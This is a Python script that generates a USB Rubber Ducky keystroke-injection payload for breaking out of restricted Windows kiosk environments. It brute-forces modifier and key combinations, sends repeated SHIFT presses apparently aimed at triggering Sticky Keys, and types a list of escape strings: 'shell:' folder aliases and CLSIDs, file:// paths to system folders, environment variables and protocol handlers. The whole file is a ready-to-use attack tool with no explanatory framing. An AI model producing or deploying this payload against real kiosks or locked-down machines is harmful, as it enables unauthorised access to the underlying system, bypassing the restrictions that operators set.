MODIFIERS = [
    ['CTRL'],
    ['ALT'],
    ['CTRL', 'ALT'],
    ['CTRL', 'SHIFT'],
    ['FN'],
    ['FN', 'SHIFT'],
    ['WINDOWS'],
    ['WINDOWS', 'SHIFT'],
    ['ALT', 'SHIFT'],
    ['ALT', 'WINDOWS']
]

COMMON_KEYS = (
    [chr(c) for c in range(ord('a'), ord('z') + 1)] +
    [str(d) for d in range(0, 10)] +
    [
        'ESCAPE', 'ESC', 'TAB', 'ENTER', 'SPACE',
        'DELETE', 'BACKSPACE', 'INSERT', 'HOME', 'END', 'NUMLOCK', 'MENU', 'PRINTSCREEN', 
        'F1', 'F2', 'F3', 'F4', 'F5', 'F6', 'F7', 'F8', 'F9', 'F10', 'F11', 'F12'
    ]
)

altstring_payloads = [
    "shell:Administrative Tools",
    "shell:DocumentsLibrary",
    "shell:Libraries",
    "shell:UserProfiles",
    "shell:Personal",
    "shell:SearchHomeFolder",
    "shell:NetworkPlacesFolder",
    "shell:SendTo",
    "shell:UserProfiles",
    "shell:Common Administrative Tools",
    "shell:MyComputerFolder",
    "shell:InternetFolder",
    "Shell:Profile",
    "Shell:ProgramFiles",
    "Shell:System",
    "Shell:ControlPanelFolder",
    "Shell:Windows",
    "shell:::{21EC2020 3AEA 1069 A2DD 08002B30309D}",
    "shell:::{20D04FE0 3AEA 1069 A2D8 08002B30309D}",
    "shell:::{{208D2C60 3AEA 1069 A2D7 08002B30309D}}",
    "shell:::{871C5380 42A0 1069 A2EA 08002B30309D}",
    "file:///C:/Kiosk/HTML/index.html",
    "file:///C:/Users/KioskRestricted",
    "File:/C:/windows",
    "File:/C:\\windows\\",
    "File:/C:\\windows/",
    "File:/C:/windows",
    "File://C:/windows",
    "File://C:\\windows/",
    "file://C:\\windows",
    "C:/windows",
    "C:\\windows\\",
    "C:\\windows",
    "C:/windows/",
    "C:/windows\\",
    "%WINDIR%",
    "%TMP%",
    "%TEMP%",
    "%SYSTEMDRIVE%",
    "%SYSTEMROOT%",
    "%APPDATA%",
    "%HOMEDRIVE%",
    "%HOMESHARE%",
    "Callto://",
    "Gopher://",
    "DHCP://",
    "Telnet://",
    "TN3270://",
    "Rlogin://",
    "LDAP://",
    "News://",
    "Mailto://",
    "MMS://",
    "SKYPE://",
    "SIP://",
    "Play://",
    "Steam://",
    "Quicktime://",
    "smb://",
    "ftp://"
]


def combo_to_ducky(combo):
    return ' '.join(combo)

def generate(output_path='breakout_payload.txt'):
    with open(output_path, 'w') as f:
        # change default delay 
        f.write("DEFAULT_DELAY 50\n")

        f.write("\nREM === Modifier Brute Force Combos ===\n")
        for mod in MODIFIERS:
            for key in COMMON_KEYS:
                full_combo = mod + [key if len(key) == 1 and key.isalpha() else key]
                f.write(combo_to_ducky(full_combo) + '\n')

        for _ in range(5):
            f.write("SHIFT\n")

        for string in altstring_payloads:
            result = "ALTSTRING " + string + "\n"
            f.write(result)
        

if __name__ == "__main__":
    generate()
